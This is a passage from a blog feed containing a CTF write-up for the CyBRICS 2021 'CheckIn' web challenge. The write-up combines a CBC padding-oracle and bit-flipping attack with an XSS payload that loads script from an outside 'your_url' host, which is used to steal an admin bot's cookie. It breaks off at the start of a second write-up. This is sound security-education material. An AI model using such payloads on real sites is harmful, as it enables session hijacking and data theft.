HH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png" alt="image-20210729181535279"></p><p>We first XOR <code>c1</code>  with <code>p2 XOR p2'</code> to get <code>c1'</code>. In this way, <code>IV || c1' || c2 || c3</code> will be decrypted into <code>junk || p2' || p3</code>.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png" alt="image-20210729181301243"></p><p>The nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by <code>JSON.parse()</code>. What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR <code>IV</code> with <code>junk XOR p1'</code> to get a new <code>IV'</code>. In this way, <code>IV' || c1' || c2 || c3</code> will be decrypted into <code>p1' || p2' || p3</code>, which is exactly we want!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png" alt="image-20210729182312222"></p><h2 id="The-XSS-Part"><a href="#The-XSS-Part" class="headerlink" title="The XSS Part"></a>The XSS Part</h2><p>So we could encrypt what we want now. What should we do next? According to the description of the challenge, we have to go and get the content of the central surveillance system to get the information of  Mr.Flag Flagger. But how?</p><p>Let’s take a look at the json. There may be a bot in the backend use <code>JSON.parse()</code> to parse the json and some method to render a page with these json data. For example, <code>res.render("render.html", name=json.name, surname=json.surname)</code>. So we could try to inject a XSS vector into the plaintext, encrypt it and then send the payload to the bot through the upload API.</p><p>But, at first we need to understand the correspondence between API parameters and JSON parameters. After do a test, we generate a ciphertext through the <code>/finalize</code> API and decrypt the ciphertext to get the correspondence. </p><p></p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http:<span class="hljs-comment">//207.154.224.121:8080/finalize?lastName=1&amp;firstName=2&amp;origin=3&amp;Gender=4&amp;destination=5</span></span><br><span class="line"></span><br><span class="line">CipherText:</span><br><span class="line"><span class="hljs-number">8B</span>AHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3N</span><br><span class="line"></span><br><span class="line">PlainText:</span><br><span class="line">b<span class="hljs-number">'</span>{<span class="hljs-string">"name"</span>: <span class="hljs-string">"2"</span>, <span class="hljs-string">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-string">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}'</span><br></pre></td></tr></tbody></table></figure><p></p><p>Okay. But which one we should inject the XSS vector? You could try one by one but I think there is a hint in the source code of the challenge.</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--</span></span><br><span class="line"><span class="hljs-comment">&lt;h2&gt;Passenger data&lt;/h2&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;h3&gt;Name:&lt;/h3&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;h4&gt;qweqwe&lt;/h4&gt;</span></span><br><span class="line"><span class="hljs-comment">--&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>It looks like the Name is what we want. So we should craft a payload like this.</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"name"</span>: <span class="hljs-string">"&lt;script src=http://your_url/?2&gt;&lt;/script&gt;"</span>, <span class="hljs-attr">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-attr">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-attr">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-attr">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-attr">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-attr">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>When we generate the ciphertext, we first need to generate a cipher whose the length of the name parameter is the same length as the name parameter in the XSS payload we constructed. In this exmaple, the name is <code>&lt;script src=http://your_url/?2&gt;&lt;/script&gt;</code> and its length is 40. Therefore, we should generate a ciphertext with a name of length 40 through the <code>/finalize</code> API. And we’d better leave the other parameters as default values.</p><p></p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL:</span><br><span class="line">http:<span class="hljs-comment">//207.154.224.121:8080/finalize?lastName=1&amp;firstName=0000000000000000000000000000000000000000&amp;origin=3&amp;Gender=4&amp;destination=5</span></span><br><span class="line"></span><br><span class="line">PlainText:</span><br><span class="line">b<span class="hljs-number">'</span>{<span class="hljs-string">"name"</span>: <span class="hljs-string">"0000000000000000000000000000000000000000"</span>, <span class="hljs-string">"surname"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"middle"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"time"</span>: <span class="hljs-string">"2021-07-26 13:37:00"</span>, <span class="hljs-string">"dest"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"dep"</span>: <span class="hljs-string">"3"</span>, <span class="hljs-string">"flight"</span>: <span class="hljs-string">"BLZH1337"</span>}'</span><br></pre></td></tr></tbody></table></figure><p></p><p>After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping.  And then use base64 and aztec code to encode the ciphertext and  upload the aztec code. At last, XSS fires!<br><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png" alt=""></p><p>Now, we get the admin’s cookie and the source code of the admin’s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched ‘Flagger’ as described in the challenge and got the flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png" alt=""></p><p>Thanks for your reading. Hope you like the writeup! XD</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;This is the fork of my friend’s blog: &lt;a href=&quot;https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/&lt;/a&gt;. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Two Webs&#39; Writeup in Google CTF Quals 2021</title>
    <link href="https://blog.zeddyu.info/2021/07/21/google-qual-2021/"/>
    <id>https://blog.zeddyu.info/2021/07/21/google-qual-2021/</id>
    <published>2021-07-21T02:58:54.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>I played Google CTF Quals 2021 and here is my writeup.</p><a id="more"></a><p>I played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldn’t do much. Hope I could do more in the next time!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvE